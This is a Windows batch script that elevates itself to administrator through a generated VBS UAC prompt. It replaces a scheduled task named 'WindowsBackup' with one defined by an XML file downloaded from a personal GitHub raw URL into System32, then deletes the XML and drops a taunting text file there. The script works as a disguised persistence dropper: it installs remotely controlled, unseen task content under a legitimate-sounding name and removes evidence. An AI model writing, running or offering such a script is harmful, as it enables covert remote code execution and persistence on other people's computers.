set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

schtasks /End /TN "WindowsBackup"
schtasks /Delete /TN "WindowsBackup" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitukitii/test/main/windowsbackup.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowsbackup.xml'"
schtasks /create /tn "WindowsBackup" /xml "C:\Windows\System32\WindowsPowerShell\windowsbackup.xml" /f
del /f /q "C:\Windows\System32\WindowsPowerShell\windowsbackup.xml"
echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe2.txt"

exit
